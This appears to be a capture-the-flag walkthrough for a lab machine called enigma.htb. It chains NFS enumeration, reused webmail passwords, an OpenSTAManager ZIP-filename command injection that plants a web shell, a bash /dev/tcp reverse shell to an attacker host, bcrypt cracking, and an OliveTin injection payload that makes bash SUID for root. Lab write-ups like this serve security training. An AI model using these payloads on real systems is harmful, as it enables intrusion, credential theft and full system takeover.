## Initial Enumeration

We begin by performing a full TCP port scan.

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
```

The scan revealed several open ports, so a service version and default script scan was performed.

```bash
nmap -p22,80,110,111,143,993,995,2049,38709,39809,43887,51405,53617 -sV -sC <TARGET_IP>
```

Port **80** redirected to **enigma.htb**.

```bash
echo "<TARGET_IP> enigma.htb" | sudo tee -a /etc/hosts
```

## NFS Enumeration

List the available exports.

```bash
showmount -e <TARGET_IP>
```

The server exported:

```text
/srv/nfs/onboarding
```

Mount the share.

```bash
sudo mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /<MOUNT_DIRECTORY>
```

Inside the share we discovered `New_Employee_Access.pdf`, which contained onboarding credentials and a reference to the internal Roundcube webmail instance.

> **Insert screenshot:** Roundcube login page

## Webmail Enumeration

Authenticate with:

```text
Username: kevin
Password: Enigma2024!
```

Kevin's mailbox contained an email from **sarah@enigma.htb**. Attempting password reuse successfully authenticated as Sarah and revealed credentials for OpenSTAManager.

```text
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

> **Insert screenshot:** OpenSTAManager dashboard

## Initial Foothold – OpenSTAManager (CVE-2025-69212)

Enumeration revealed the application file path:

```text
/var/www/html/openstamanager/files/
```

The **Importazione FE** plugin is vulnerable to **CVE-2025-69212**, an OS command injection vulnerability caused by unsafely passing ZIP filenames to a shell command.

Generate the malicious ZIP archive using the exploit script, upload it through:

`Sales → Sales Invoices → PLUG-IN → Importazione FE`

The uploaded web shell is reachable at:

```text
http://support_001.enigma.htb/files/SHELL.php?c=whoami
```

Start a listener:

```bash
nc -lvnp <PORT>
```

Execute:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```

to obtain a reverse shell.

## User Access

Database credentials were recovered from:

```text
/var/www/html/openstamanager/config.inc.php
```

Connect to MySQL:

```bash
mysql -u brollin -p
```

Enumerate:

```sql
SHOW DATABASES;
USE openstamanager;
SHOW TABLES;
SELECT * FROM zz_users;
```

Crack the recovered bcrypt hash:

```bash
john hash.txt --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
haris : bestfriends
```

Switch users and read the user flag.

```bash
su haris
cat /home/haris/user.txt
```

## Privilege Escalation – OliveTin (CVE-2026-27626)

Generate an SSH key pair:

```bash
ssh-keygen -t ed25519
```

Copy the public key to `~/.ssh/authorized_keys` for `haris`, then forward the service:

```bash
ssh -i id_ed25519 -L 1337:127.0.0.1:1337 haris@enigma.htb
```

OliveTin version **3000.10.0** is vulnerable to **CVE-2026-27626**, an OS command injection vulnerability. Because actions execute as **root**, command injection results in root command execution.

Use the **Backup Database** action.

Read the root flag:

```text
'; cat /root/root.txt #
```

Or make Bash SUID:

```text
'; chmod +s /bin/bash #
```

Then execute:

```bash
/bin/bash -p
```

to obtain a root shell.

The machine is now fully compromised.
